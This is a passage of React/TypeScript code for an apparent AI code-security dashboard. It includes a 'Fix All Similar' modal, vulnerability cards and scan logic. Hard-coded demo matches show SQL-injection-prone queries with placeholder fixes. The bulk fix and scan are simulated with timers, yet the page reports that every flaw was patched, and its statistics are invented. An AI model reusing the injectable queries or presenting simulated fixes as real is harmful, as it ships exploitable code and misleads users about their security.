              <CheckCircle size={14} color="#00ff88" />
              <span>Analysis complete — {steps.length} reasoning steps · High confidence detection</span>
            </div>
          )}
        </div>
      )}
    </div>
  )
}

// ─── TYPEWRITER ──────────────────────────────────────────────────────────────
function TypewriterText({ text, delay = 0 }: { text: string; delay?: number }) {
  const [displayed, setDisplayed] = useState('')
  useEffect(() => {
    setDisplayed('')
    const timer = setTimeout(() => {
      let i = 0
      const t = setInterval(() => {
        i++; setDisplayed(text.slice(0, i))
        if (i >= text.length) clearInterval(t)
      }, 18)
      return () => clearInterval(t)
    }, delay)
    return () => clearTimeout(timer)
  }, [text, delay])
  return <span>{displayed}<span className="cursor-blink">▋</span></span>
}

// ─── FIX ALL MODAL ────────────────────────────────────────────────────────────
function FixAllModal({ vuln, code, onClose }: { vuln: any; code: string; onClose: () => void }) {
  const [phase, setPhase] = useState<'scan' | 'preview' | 'done'>('scan')
  const [scanning, setScanning] = useState(true)
  const [result, setResult] = useState<PatternScanResult | null>(null)
  const [applying, setApplying] = useState(false)

  const DEMO_MATCHES: SimilarMatch[] = [
    { id: '1', filePath: 'app/api/users/route.ts', lineNumber: 23, lineContent: `const q = "SELECT * FROM users WHERE id = " + userId`, vulnerableSnippet: `"SELECT * FROM users WHERE id = " + userId`, patchedSnippet: `"SELECT * FROM users WHERE id = ?"  // parameterized`, patternType: 'SQL string concatenation' },
    { id: '2', filePath: 'lib/db/queries.ts', lineNumber: 47, lineContent: `db.query("SELECT * FROM orders WHERE user='" + user + "'")`, vulnerableSnippet: `"SELECT * FROM orders WHERE user='" + user + "'"`, patchedSnippet: `"SELECT * FROM orders WHERE user=?"  // parameterized`, patternType: 'SQL string concatenation' },
    { id: '3', filePath: 'services/authService.ts', lineNumber: 89, lineContent: `const sql = \`SELECT * FROM sessions WHERE token='\${token}'\`` , vulnerableSnippet: `\`SELECT * FROM sessions WHERE token='\${token}'\``, patchedSnippet: `"SELECT * FROM sessions WHERE token=?"  // parameterized`, patternType: 'Template literal SQL injection' },
    { id: '4', filePath: 'controllers/searchController.ts', lineNumber: 12, lineContent: `db.execute("SELECT * FROM products WHERE name='" + name + "'")`, vulnerableSnippet: `"SELECT * FROM products WHERE name='" + name + "'"`, patchedSnippet: `"SELECT * FROM products WHERE name=?"  // parameterized`, patternType: 'SQL string concatenation' },
  ]

  useEffect(() => {
    setTimeout(() => {
      setResult({ vulnerabilityType: vuln.name, totalMatches: DEMO_MATCHES.length, matches: DEMO_MATCHES, summary: `Found ${DEMO_MATCHES.length} instances of SQL string concatenation across your codebase.`, estimatedRiskReduction: 94 })
      setScanning(false)
      setPhase('preview')
    }, 2200)
  }, [])

  const applyAll = async () => {
    setApplying(true)
    await new Promise(r => setTimeout(r, 1800))
    setApplying(false)
    setPhase('done')
  }

  return (
    <div className="modal-bg" onClick={e => e.target === e.currentTarget && onClose()}>
      <div className="fix-all-modal" style={{ animation: 'popUp 0.3s ease' }}>
        <div className="fam-header">
          <div><div className="fam-title"><GitBranch size={16} /> Fix All Similar Vulnerabilities</div><div className="fam-sub">Scanning codebase for {vuln.name} patterns...</div></div>
          <button className="fam-close" onClick={onClose}><X size={16} /></button>
        </div>

        {scanning && (
          <div className="fam-scanning">
            <div className="scan-orb" style={{ width: 60, height: 60 }}><Sparkles size={22} color="#00ff88" /></div>
            <div className="fam-scan-text">Scanning for similar patterns...</div>
            <div className="prog-rail" style={{ width: '100%', marginTop: 8 }}><div className="prog-fill" style={{ width: '70%', animation: 'expandWidth 2s ease forwards' }} /></div>
          </div>
        )}

        {phase === 'preview' && result && (
          <div style={{ animation: 'fadeIn 0.3s ease' }}>
            <div className="fam-stats">
              <div className="fam-stat-box"><div className="fam-stat-num" style={{ color: '#ff6b6b' }}>{result.totalMatches}</div><div className="fam-stat-label">Matches Found</div></div>
              <div className="fam-stat-box"><div className="fam-stat-num" style={{ color: '#00ff88' }}>{result.estimatedRiskReduction}%</div><div className="fam-stat-label">Risk Reduction</div></div>
              <div className="fam-stat-box"><div className="fam-stat-num" style={{ color: '#a78bfa' }}>{result.matches.length}</div><div className="fam-stat-label">Files Affected</div></div>
            </div>

            <div className="fam-matches">
              {result.matches.map((m, i) => (
                <div key={m.id} className="fam-match" style={{ animationDelay: `${i * 0.1}s` }}>
                  <div className="fam-match-header">
                    <div className="fam-file"><FileCode2 size={12} color="#a78bfa" />{m.filePath}</div>
                    <div className="fam-line-tag">Line {m.lineNumber}</div>
                  </div>
                  <div className="fam-diff-mini">
                    <div className="fam-before"><span className="fam-marker red">−</span><code>{m.vulnerableSnippet}</code></div>
                    <div className="fam-after"><span className="fam-marker green">+</span><code>{m.patchedSnippet}</code></div>
                  </div>
                </div>
              ))}
            </div>

            <div className="fam-actions">
              <button className="fam-cancel" onClick={onClose}>Cancel</button>
              <RippleBtn className="fam-apply" onClick={applyAll} disabled={applying}>
                {applying ? <><div className="spin-dot" /> Applying fixes...</> : <><Wrench size={14} /> Apply Secure Refactor to All {result.totalMatches} Matches</>}
              </RippleBtn>
            </div>
          </div>
        )}

        {phase === 'done' && (
          <div className="fam-done" style={{ animation: 'fadeIn 0.4s ease' }}>
            <div className="fam-done-icon"><CheckCircle size={40} color="#00ff88" /></div>
            <div className="fam-done-title">All Vulnerabilities Patched</div>
            <div className="fam-done-sub">{result?.totalMatches} instances of {vuln.name} fixed across your codebase. Parameterized queries applied to all SQL operations.</div>
            <RippleBtn className="btn-green" onClick={onClose} style={{ marginTop: 24, width: '100%', justifyContent: 'center' }}>Close & Review Changes</RippleBtn>
          </div>
        )}
      </div>
    </div>
  )
}

// ─── VULN CARD ────────────────────────────────────────────────────────────────
function VulnCard({ v, i }: { v: any; i: number }) {
  const [expanded, setExpanded] = useState(false)
  const [copied, setCopied] = useState(false)
  const [showFixAll, setShowFixAll] = useState(false)
  const [codeCtx] = useState(CODE_SAMPLES['JavaScript']?.vulnb || '')
  const copyFix = () => { navigator.clipboard.writeText(v.howToFix || ''); setCopied(true); setTimeout(() => setCopied(false), 2000) }
  const isCrit = v.severity === 'critical'

  return (
    <>
      {showFixAll && <FixAllModal vuln={v} code={codeCtx} onClose={() => setShowFixAll(false)} />}
      <div className={`vuln-card ${expanded ? 'expanded' : ''}`} style={{ animationDelay: `${i * 0.09}s` }}>
        <div className="vuln-stripe" style={{ background: isCrit ? 'linear-gradient(to bottom,#ff4444,transparent)' : 'linear-gradient(to bottom,#f97316,transparent)' }} />
        <div className="vuln-top" onClick={() => setExpanded(!expanded)} style={{ cursor: 'pointer' }}>
          <div>
            <div className="vuln-meta">
              <span className="vuln-sev" style={{ background: isCrit ? '#ff4444' : '#f97316', color: '#fff' }}>{v.severity}</span>
              <span className="vuln-id">V-ID: SY-{i + 102}</span>
              {v.cwe && <span className="vuln-id">{v.cwe}</span>}
              {v.cvss && <span className="cvss-badge" style={{ color: isCrit ? '#ff6b6b' : '#fb923c' }}>CVSS {v.cvss}</span>}
            </div>
            <h3 className="vuln-name">{v.name}</h3>
          </div>
          <div style={{ display: 'flex', alignItems: 'center', gap: 12 }}>
            {v.line > 0 && <div className="vuln-line">Line {v.line}</div>}
            <div className={`expand-chevron ${expanded ? 'rotated' : ''}`}><ChevronRight size={16} color="rgba(255,255,255,0.3)" /></div>
          </div>
        </div>
        <div className="vuln-short-desc">{v.what?.split('.')[0]}.</div>

        <div className={`vuln-expand-body ${expanded ? 'open' : ''}`}>
          <div className="vuln-sections">
            <div className="vuln-sec-full">
              <div className="vsec-label" style={{ color: 'rgba(255,255,255,0.4)' }}><Activity size={12} /> What Is This Vulnerability?</div>
              <div className="vsec-content">{v.what}</div>
            </div>
            <div className="vuln-sec-full">
              <div className="vsec-label" style={{ color: '#ff6b6b' }}><AlertTriangle size={12} /> What Can An Attacker Do?</div>
              <div className="vsec-content" style={{ borderColor: 'rgba(255,107,107,0.12)', background: 'rgba(255,59,59,0.04)' }}>{v.impact}</div>
            </div>
            <div className="vuln-sec-full">
              <div className="vsec-label" style={{ color: '#00ff88' }}><Lock size={12} /> How To Fix It (Step by Step)</div>
              <div className="vsec-content" style={{ borderColor: 'rgba(0,255,136,0.12)', background: 'rgba(0,255,136,0.04)', color: '#a7f3d0' }}>{v.howToFix}</div>
              <div style={{ display: 'flex', gap: 10, marginTop: 8, flexWrap: 'wrap' }}>
                <RippleBtn className="copy-fix-btn" onClick={copyFix}>{copied ? <><CheckCircle size={12} /> Copied!</> : <><Copy size={12} /> Copy Fix</>}</RippleBtn>
                <RippleBtn className="fix-all-trigger" onClick={() => setShowFixAll(true)}><GitBranch size={12} /> Fix All Similar ({i + 3} found)</RippleBtn>
              </div>
            </div>
            {v.realWorld && (
              <div className="vuln-sec-full">
                <div className="vsec-label" style={{ color: '#fbbf24' }}><Zap size={12} /> Real-World Breach Example</div>
                <div className="vsec-content" style={{ borderColor: 'rgba(251,191,36,0.12)', background: 'rgba(251,191,36,0.04)', color: '#fde68a' }}>{v.realWorld}</div>
              </div>
            )}

            {/* Attack Simulation Panel */}
            <AttackSimulationPanel vuln={v} />

            {/* AI Reasoning Panel */}
            <ReasoningPanel vuln={v} />
          </div>
        </div>

        {!expanded && (
          <button className="expand-hint" onClick={() => setExpanded(true)}>
            <Eye size={11} /> Click to read full analysis, attack simulation & AI reasoning
          </button>
        )}
      </div>
    </>
  )
}

// ─── MAIN DASHBOARD ───────────────────────────────────────────────────────────
export default function UnifiedDashboard() {
  const router = useRouter()
  const [user, setUser] = useState<any>(null)
  const [stats, setStats] = useState({ total: 0, vulns: 0, crit: 0, patched: 0 })
  const [language, setLanguage] = useState('JavaScript')
  const [code, setCode] = useState(CODE_SAMPLES['JavaScript'].vulnb)
  const [scanMode, setScanMode] = useState<'code' | 'url'>('code')
  const [phase, setPhase] = useState<'idle' | 'scanning' | 'alert' | 'report'>('idle')
  const [scanSteps, setScanSteps] = useState<string[]>([])
  const [vulns, setVulns] = useState<any[]>([])
  const [profileOpen, setProfileOpen] = useState(false)
  const [exportOpen, setExportOpen] = useState(false)
  const [chatMessages, setChatMessages] = useState<{ role: 'user' | 'bot'; text: string }[]>([])
  const [chatInput, setChatInput] = useState('')
  const [isTyping, setIsTyping] = useState(false)
  const [activeTab, setActiveTab] = useState<'vulns' | 'original' | 'corrected' | 'sentry'>('sentry')
  const [scanProgress, setScanProgress] = useState(0)
  const chatEndRef = useRef<HTMLDivElement>(null)
  const vulnsRef = useRef<any[]>([])
  const langRef = useRef('JavaScript')
  const codeRef = useRef('')

  useEffect(() => { chatEndRef.current?.scrollIntoView({ behavior: 'smooth' }) }, [chatMessages, isTyping])

  useEffect(() => {
    const init = async () => {
      const { data: { user } } = await supabase.auth.getUser()
      const u = user || { email: 'demo@cybersentry.ai', id: 'promo-id' }
      setUser(u)
      const { data } = await supabase.from('scans').select('*').eq('user_id', u.id)
      if (data) { let vCount = 0, critCount = 0; data.forEach((s: any) => { if (s.vulnerabilities) { vCount += s.vulnerabilities.length; critCount += s.vulnerabilities.filter((v: any) => v.severity === 'critical' || v.severity === 'high').length } }); setStats({ total: data.length, vulns: vCount, crit: critCount, patched: vCount }) }
    }
    init()
  }, [])

  const startScan = async () => {
    setPhase('scanning'); setScanSteps([]); setScanProgress(0)
    const steps = scanMode === 'url'
      ? ['Resolving hostname & DNS records', 'Running HTTP reconnaissance', 'Auditing TLS/SSL certificates', 'Checking security response headers', 'Mapping attack surface', 'Generating threat report']
      : ['Initializing AST scan engine', 'Building syntax tree & call graph', 'Running OWASP Top-10 rule checks', 'Checking for injection patterns', 'Analyzing data flow paths', 'Finalizing vulnerability report']
    for (let i = 0; i < steps.length; i++) {
      setScanSteps(p => [...p, steps[i]]); setScanProgress(Math.round(((i + 1) / steps.length) * 100))
      await new Promise(r => setTimeout(r, 600))
    }
    const { vulns: found } = analyzeCode(code, scanMode, language)
    setVulns(found); vulnsRef.current = found; langRef.current = language; codeRef.current = code
    setChatMessages([{ role: 'bot', text: found.length > 0 ? `Security audit complete. Found ${found.length} vulnerabilit${found.length === 1 ? 'y' : 'ies'} in your ${language} code.\n\nMost critical: **${found[0].name}** (CVSS ${found[0].cvss}/10). ${found[0].what?.split('.')[0]}.\n\nExpand the vulnerability cards below to see attack simulations and AI reasoning. Ask me anything in the chat.` : `Security audit complete. No vulnerabilities found in your ${language} code. You're following best practices.` }])
    await new Promise(r => setTimeout(r, 800))
    setPhase(found.length > 0 ? 'alert' : 'report')
    try { if (user) await supabase.from('scans').insert({ user_id: user.id, code, language: scanMode === 'url' ? 'URL' : language, vulnerabilities: found, fixed_code: scanMode === 'code' ? CODE_SAMPLES[language]?.fixed || code : '', security_score: found.length === 0 ? 100 : Math.max(12, 100 - found.length * 30), status: 'completed' }) } catch (e) { }
  }

  const handleLanguageChange = (lang: string) => { setLanguage(lang); if (CODE_SAMPLES[lang]) setCode(CODE_SAMPLES[lang].vulnb) }

  const sendAIQuery = async (override?: string) => {
    const msg = (override || chatInput).trim(); if (!msg || isTyping) return
    setChatMessages(p => [...p, { role: 'user', text: msg }]); setChatInput(''); setIsTyping(true)
    const res = await askClaudeAI(msg, vulnsRef.current, langRef.current, codeRef.current)
    setChatMessages(p => [...p, { role: 'bot', text: res }]); setIsTyping(false)
  }

  const signOut = async () => { await supabase.auth.signOut(); router.push('/') }
  const username = user?.email?.split('@')[0] || 'user'

  const TICKER = [{ label: 'Agent status', val: 'ONLINE' }, { label: 'OWASP coverage', val: '100%' }, { label: 'Critical blocked', val: '2,341' }, { label: 'Avg scan time', val: '<4.2s' }, { label: 'Languages', val: '9' }, { label: 'Vulnerabilities today', val: '12,847' }]
  const SUGGEST_QS = vulns.length > 0 ? [`What exactly is ${vulns[0]?.name}?`, 'How dangerous is this?', 'Step-by-step fix?', 'Real-world breach example?', 'Fix priority order?'] : ['What is SQL Injection?', 'What is XSS?', 'How do I prevent breaches?']

  return (
    <>
      <style>{`
        @import url('https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;600;700&display=swap');
        *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
        html,body{background:#000;color:#fff;font-family:'Space Grotesk',sans-serif;-webkit-font-smoothing:antialiased;overflow-x:hidden}

        /* TICKER */
        .ticker-wrap{background:#000;border-bottom:1px solid rgba(255,255,255,0.06);overflow:hidden;height:36px;display:flex;align-items:center}
        .ticker-track{display:flex;animation:ticker 30s linear infinite;white-space:nowrap}
        .ticker-item{display:inline-flex;align-items:center;gap:8px;padding:0 40px;font-family:'JetBrains Mono',monospace;font-size:11px;font-weight:500;color:rgba(255,255,255,0.35)}
        .t-dot{width:6px;height:6px;border-radius:50%;background:#00ff88;box-shadow:0 0 6px #00ff88;flex-shrink:0}
        .t-val{color:#00ff88;font-weight:700}

        /* NAV */
        .dash-nav{position:sticky;top:0;z-index:100;background:rgba(0,0,0,0.95);backdrop-filter:blur(20px);border-bottom:1px solid rgba(255,255,255,0.06);height:64px;display:flex;align-items:center;justify-content:space-between;padding:0 32px}
        .nav-left{display:flex;align-items:center;gap:20px}
        .brand{display:flex;align-items:center;gap:10px;cursor:pointer;transition:opacity 0.2s}
        .brand:hover{opacity:0.8}
        .brand-icon{width:32px;height:32px;border-radius:8px;background:#000;border:1px solid rgba(0,255,136,0.3);display:flex;align-items:center;justify-content:center;box-shadow:0 0 12px rgba(0,255,136,0.12)}
        .brand-name{font-family:'JetBrains Mono',monospace;font-size:16px;font-weight:700;color:#fff}
        .brand-ai{font-size:10px;font-weight:800;color:#000;background:#00ff88;padding:2px 7px;border-radius:4px}
        .nav-pill{display:flex;align-items:center;gap:7px;background:rgba(0,255,136,0.07);border:1px solid rgba(0,255,136,0.18);color:#00ff88;font-size:12px;font-weight:600;padding:5px 14px;border-radius:20px;font-family:'JetBrains Mono',monospace}
        .green-dot{width:6px;height:6px;border-radius:50%;background:#00ff88;box-shadow:0 0 8px #00ff88;animation:blink 2s infinite;flex-shrink:0}
        .user-pill{display:flex;align-items:center;gap:9px;background:rgba(255,255,255,0.04);border:1px solid rgba(255,255,255,0.07);padding:5px 14px 5px 5px;border-radius:40px;cursor:pointer;transition:all 0.2s}
        .user-pill:hover{border-color:rgba(0,255,136,0.3)}
        .u-avatar{width:28px;height:28px;border-radius:50%;background:#00ff88;display:flex;align-items:center;justify-content:center;font-size:12px;font-weight:800;color:#000;text-transform:uppercase}
        .u-name{font-size:13px;font-weight:600;color:rgba(255,255,255,0.8)}
        .drop-menu{position:absolute;top:calc(100% + 10px);right:0;width:210px;background:#0a0a0a;border:1px solid rgba(255,255,255,0.08);border-radius:12px;overflow:hidden;box-shadow:0 20px 60px rgba(0,0,0,0.8);animation:fadeDown 0.15s ease;z-index:200}
        .drop-head{padding:12px 16px;border-bottom:1px solid rgba(255,255,255,0.05);background:rgba(255,255,255,0.02)}
        .drop-label{font-size:10px;font-weight:700;color:rgba(255,255,255,0.25);text-transform:uppercase;letter-spacing:0.1em;margin-bottom:3px;font-family:'JetBrains Mono',monospace}
        .drop-email{font-size:12px;font-weight:600;color:rgba(255,255,255,0.65);white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
        .drop-item{width:100%;padding:10px 16px;display:flex;align-items:center;gap:10px;font-size:13px;font-weight:500;color:rgba(255,255,255,0.5);background:none;border:none;cursor:pointer;text-align:left;border-bottom:1px solid rgba(255,255,255,0.04);transition:all 0.15s}
        .drop-item:last-child{border-bottom:none}
        .drop-item:hover{background:rgba(255,255,255,0.04);color:#fff}
        .drop-item.danger{color:#f87171}
        .drop-item.danger:hover{background:rgba(248,113,113,0.07)}

        /* PAGE */
        .page-root{min-height:100vh;background:#000;display:flex;flex-direction:column}
        .page-main{max-width:1280px;width:100%;margin:0 auto;padding:40px 32px;display:flex;flex-direction:column;gap:24px}

        /* HERO */
        .hero{position:relative;overflow:hidden;background:#000;border:1px solid rgba(255,255,255,0.07);border-radius:16px;padding:48px 52px;transition:border-color 0.3s}
        .hero:hover{border-color:rgba(0,255,136,0.15)}
        .hero::after{content:'';position:absolute;bottom:-80px;right:-80px;width:350px;height:350px;background:radial-gradient(circle,rgba(0,255,136,0.07) 0%,transparent 70%);pointer-events:none;border-radius:50%}
        .hero-eyebrow{display:inline-flex;align-items:center;gap:8px;font-family:'JetBrains Mono',monospace;font-size:11px;font-weight:700;letter-spacing:0.12em;color:#00ff88;text-transform:uppercase;margin-bottom:20px}
        .hero-h1{font-size:52px;font-weight:800;letter-spacing:-0.04em;line-height:1.05;color:#fff;margin-bottom:16px}
        .hero-accent{color:#00ff88}
        .hero-sub{font-size:15px;color:rgba(255,255,255,0.35);line-height:1.7;max-width:460px}

        /* STATS */
        .stats-row{display:grid;grid-template-columns:repeat(4,1fr);gap:14px}
        .stat-card{background:#080808;border:1px solid rgba(255,255,255,0.06);border-radius:14px;padding:22px;display:flex;flex-direction:column;gap:14px;transition:all 0.25s;cursor:default}
        .stat-card:hover{border-color:rgba(0,255,136,0.2);box-shadow:0 0 24px rgba(0,255,136,0.05);transform:translateY(-2px)}
        .stat-icon{width:38px;height:38px;border-radius:9px;display:flex;align-items:center;justify-content:center;transition:transform 0.2s}
        .stat-card:hover .stat-icon{transform:scale(1.1)}
        .counter-val{font-family:'JetBrains Mono',monospace;font-size:36px;font-weight:700;color:#fff;line-height:1}
        .stat-label{font-size:12px;font-weight:500;color:rgba(255,255,255,0.28);font-family:'JetBrains Mono',monospace}

        /* SCANNER */
        .scanner-card{background:#080808;border:1px solid rgba(255,255,255,0.06);border-radius:16px;overflow:hidden}
        .sc-tabs{display:flex;background:#040404;border-bottom:1px solid rgba(255,255,255,0.06)}
        .sc-tab{flex:1;display:flex;align-items:center;justify-content:center;gap:9px;padding:18px 0;font-size:13px;font-weight:600;cursor:pointer;transition:all 0.2s;color:rgba(255,255,255,0.3);font-family:'JetBrains Mono',monospace;border-bottom:2px solid transparent}
        .sc-tab.on{color:#00ff88;border-bottom-color:#00ff88;background:rgba(0,255,136,0.04)}
        .sc-tab:not(.on):hover{color:rgba(255,255,255,0.6)}
        .sc-body{padding:32px 36px}
        .sc-label{display:block;font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:0.1em;color:rgba(255,255,255,0.28);font-family:'JetBrains Mono',monospace;margin-bottom:10px}
        .sc-select{width:100%;background:#040404;border:1px solid rgba(255,255,255,0.07);color:#fff;border-radius:8px;padding:12px 16px;font-family:'Space Grotesk',sans-serif;font-size:14px;appearance:none;outline:none;margin-bottom:24px;transition:border-color 0.2s}
        .sc-select:focus{border-color:rgba(0,255,136,0.35)}
        .code-ta{width:100%;min-height:220px;resize:vertical;background:#040404;border:1px solid rgba(255,255,255,0.07);border-left:3px solid #00ff88;border-radius:8px;padding:18px 20px;color:rgba(255,255,255,0.8);font-family:'JetBrains Mono',monospace;font-size:13px;line-height:1.7;outline:none;margin-bottom:24px;transition:border-color 0.2s}
        .code-ta:focus{border-color:rgba(0,255,136,0.35);border-left-color:#00ff88}
        .scan-btn{width:100%;padding:17px;background:#00ff88;border:none;border-radius:10px;color:#000;font-family:'Space Grotesk',sans-serif;font-size:15px;font-weight:800;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:10px;transition:all 0.25s;box-shadow:0 0 30px rgba(0,255,136,0.22)}
        .scan-btn:hover{background:#1aff95;box-shadow:0 0 50px rgba(0,255,136,0.42);transform:translateY(-2px)}
        .scan-btn:disabled{opacity:0.3;cursor:not-allowed;transform:none;box-shadow:none}
        .url-hint{font-size:12px;color:rgba(255,255,255,0.18);margin-top:-18px;margin-bottom:24px;line-height:1.6;font-family:'JetBrains Mono',monospace}

        /* SCANNING */
        .scan-screen{min-height:460px;background:#080808;border:1px solid rgba(255,255,255,0.06);border-radius:16px;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:32px;padding:60px;text-align:center}
        .scan-orb{width:80px;height:80px;border-radius:20px;background:#000;border:1px solid rgba(0,255,136,0.22);display:flex;align-items:center;justify-content:center;box-shadow:0 0 40px rgba(0,255,136,0.14);animation:float 3s ease-in-out infinite,scanPulse 2s ease-in-out infinite}
        .scan-h{font-family:'JetBrains Mono',monospace;font-size:24px;font-weight:700;color:#fff}
        .scan-s{font-size:13px;color:rgba(255,255,255,0.3);font-family:'JetBrains Mono',monospace;margin-top:6px}
        .scan-steps{display:flex;flex-direction:column;gap:12px;min-width:340px;text-align:left}
        .scan-step{display:flex;align-items:center;gap:12px;font-family:'JetBrains Mono',monospace;font-size:13px;color:rgba(255,255,255,0.6);animation:slideIn 0.35s ease both}
        .step-pip{width:7px;height:7px;border-radius:50%;background:#00ff88;box-shadow:0 0 8px #00ff88;flex-shrink:0}
        .prog-rail{width:340px;height:4px;background:rgba(255,255,255,0.06);border-radius:10px;overflow:hidden}
        .prog-fill{height:100%;background:#00ff88;border-radius:10px;box-shadow:0 0 10px #00ff88;transition:width 0.5s ease}
        .prog-label{font-family:'JetBrains Mono',monospace;font-size:12px;color:#00ff88;margin-top:8px}

        /* ALERT */
        .modal-bg{position:fixed;inset:0;background:rgba(0,0,0,0.88);backdrop-filter:blur(14px);display:flex;align-items:center;justify-content:center;z-index:9999;animation:fadeIn 0.2s ease}
        .alert-card{background:#080808;border:1px solid rgba(255,59,59,0.2);border-radius:20px;padding:44px;max-width:460px;width:100%;text-align:center;position:relative;box-shadow:0 0 100px rgba(255,59,59,0.08);animation:popUp 0.35s cubic-bezier(0.16,1,0.3,1)}
        .alert-close{position:absolute;top:16px;right:16px;background:none;border:none;color:rgba(255,255,255,0.22);cursor:pointer;font-size:18px;width:32px;height:32px;border-radius:6px;display:flex;align-items:center;justify-content:center;transition:all 0.2s}
        .alert-close:hover{color:#fff;background:rgba(255,255,255,0.06)}
        .alert-icon{width:70px;height:70px;border-radius:18px;background:rgba(255,59,59,0.08);border:1px solid rgba(255,59,59,0.16);display:flex;align-items:center;justify-content:center;color:#ff4444;margin:0 auto 24px;animation:shake 0.5s ease 0.3s}
        .alert-title{font-family:'JetBrains Mono',monospace;font-size:20px;font-weight:700;color:#ff4444;margin-bottom:14px}
        .alert-desc{font-size:14px;color:rgba(255,255,255,0.42);line-height:1.7;margin-bottom:26px}
        .alert-chip{display:inline-flex;align-items:center;gap:7px;background:rgba(255,59,59,0.07);border:1px solid rgba(255,59,59,0.18);color:#ff6b6b;font-size:12px;font-weight:700;padding:6px 14px;border-radius:7px;font-family:'JetBrains Mono',monospace;margin-bottom:26px}
        .alert-cta{width:100%;padding:15px;background:#ff3b3b;border:none;border-radius:10px;color:#fff;font-family:'Space Grotesk',sans-serif;font-size:14px;font-weight:800;cursor:pointer;transition:all 0.2s;box-shadow:0 0 24px rgba(255,59,59,0.22)}
        .alert-cta:hover{background:#ff5555;transform:translateY(-1px)}

        /* REPORT HEADER */
        .rep-header{background:#080808;border:1px solid rgba(255,255,255,0.06);border-radius:16px;padding:32px 36px;display:flex;justify-content:space-between;align-items:flex-start;gap:20px}
        .rep-title-row{display:flex;align-items:center;gap:12px;margin-bottom:8px}
        .rep-title{font-family:'JetBrains Mono',monospace;font-size:22px;font-weight:700;color:#fff}
        .rep-meta{font-size:12px;color:rgba(255,255,255,0.28);font-family:'JetBrains Mono',monospace;margin-bottom:18px}
        .badge-row{display:flex;gap:10px;flex-wrap:wrap}
        .sev-badge{display:inline-flex;align-items:center;gap:7px;padding:5px 12px;border-radius:6px;font-size:11px;font-weight:700;font-family:'JetBrains Mono',monospace;border:1px solid;transition:transform 0.15s}
        .sev-badge:hover{transform:scale(1.05)}
        .sev-dot{width:6px;height:6px;border-radius:50%}
        .btn-row{display:flex;gap:10px;flex-shrink:0}
        .btn-green{background:#00ff88;border:none;padding:10px 20px;border-radius:8px;color:#000;font-family:'Space Grotesk',sans-serif;font-size:13px;font-weight:800;cursor:pointer;display:flex;align-items:center;gap:8px;box-shadow:0 0 18px rgba(0,255,136,0.18);transition:all 0.2s}
        .btn-green:hover{background:#1aff95;transform:translateY(-1px)}
        .btn-ghost{background:rgba(255,255,255,0.04);border:1px solid rgba(255,255,255,0.08);padding:10px 20px;border-radius:8px;color:rgba(255,255,255,0.55);font-family:'Space Grotesk',sans-serif;font-size:13px;font-weight:600;cursor:pointer;display:flex;align-items:center;gap:8px;transition:all 0.15s}
        .btn-ghost:hover{background:rgba(255,255,255,0.08);color:#fff}
        .exp-dd{position:absolute;top:calc(100% + 8px);right:0;width:210px;background:#0a0a0a;border:1px solid rgba(255,255,255,0.08);border-radius:12px;overflow:hidden;box-shadow:0 20px 60px rgba(0,0,0,0.8);z-index:60;animation:fadeDown 0.15s ease}
        .exp-head{padding:10px 16px;border-bottom:1px solid rgba(255,255,255,0.05);font-size:10px;font-weight:700;color:rgba(255,255,255,0.22);text-transform:uppercase;letter-spacing:0.12em;font-family:'JetBrains Mono',monospace}
        .exp-item{width:100%;padding:10px 16px;display:flex;align-items:center;gap:11px;font-size:13px;font-weight:500;color:rgba(255,255,255,0.52);background:none;border:none;cursor:pointer;text-align:left;border-bottom:1px solid rgba(255,255,255,0.04);transition:all 0.15s}
        .exp-item:last-child{border-bottom:none}
        .exp-item:hover{background:rgba(255,255,255,0.04);color:#fff}
        .exp-ico{width:30px;height:30px;border-radius:7px;display:flex;align-items:center;justify-content:center;flex-shrink:0}

        /* REPORT BODY */
        .rep-body{background:#080808;border:1px solid rgba(255,255,255,0.06);border-radius:16px;overflow:hidden}
        .tab-bar{display:flex;background:#040404;border-bottom:1px solid rgba(255,255,255,0.06)}
        .rtab{padding:16px 24px;font-size:11px;font-weight:700;cursor:pointer;display:flex;align-items:center;gap:8px;color:rgba(255,255,255,0.28);border-bottom:2px solid transparent;transition:all 0.2s;white-space:nowrap;font-family:'JetBrains Mono',monospace;text-transform:uppercase;letter-spacing:0.06em}
        .rtab.on{color:#00ff88;border-bottom-color:#00ff88;background:rgba(0,255,136,0.04)}
        .rtab:not(.on):hover{color:rgba(255,255,255,0.6)}
        .tab-spacer{flex:1}
        .rtab-ai{padding:16px 24px;font-size:11px;font-weight:700;cursor:pointer;display:flex;align-items:center;gap:8px;border-bottom:2px solid transparent;transition:all 0.2s;white-space:nowrap;font-family:'JetBrains Mono',monospace;text-transform:uppercase;letter-spacing:0.06em;margin-left:auto}
        .rtab-ai.on{color:#00ff88;border-bottom-color:#00ff88;background:rgba(0,255,136,0.04)}
        .rtab-ai:not(.on){color:rgba(255,255,255,0.22)}
        .rtab-ai:not(.on):hover{color:rgba(0,255,136,0.55)}
        .tab-count-badge{background:rgba(255,59,59,0.14);color:#ff6b6b;font-size:10px;font-weight:800;padding:2px 7px;border-radius:4px;font-family:'JetBrains Mono',monospace}

        /* VULN CARDS */
        .vulns-panel{padding:24px 28px;display:flex;flex-direction:column;gap:16px}
        .vuln-card{position:relative;overflow:hidden;background:#040404;border:1px solid rgba(255,255,255,0.06);border-radius:12px;padding:22px 24px 22px 30px;transition:all 0.25s;animation:slideInUp 0.4s ease both}
        .vuln-card:hover{border-color:rgba(255,255,255,0.1);background:#060606}
        .vuln-card.expanded{border-color:rgba(0,255,136,0.12)}
        .vuln-stripe{position:absolute;left:0;top:0;bottom:0;width:3px}
        .vuln-top{display:flex;justify-content:space-between;align-items:flex-start;margin-bottom:12px}
        .vuln-meta{display:flex;align-items:center;gap:8px;margin-bottom:8px;flex-wrap:wrap}
        .vuln-sev{font-family:'JetBrains Mono',monospace;font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:0.1em;padding:3px 10px;border-radius:4px}
        .vuln-id{font-family:'JetBrains Mono',monospace;font-size:10px;color:rgba(255,255,255,0.18);background:rgba(255,255,255,0.04);padding:3px 9px;border-radius:4px}
        .cvss-badge{font-family:'JetBrains Mono',monospace;font-size:11px;font-weight:700;background:rgba(255,255,255,0.04);padding:3px 9px;border-radius:4px}
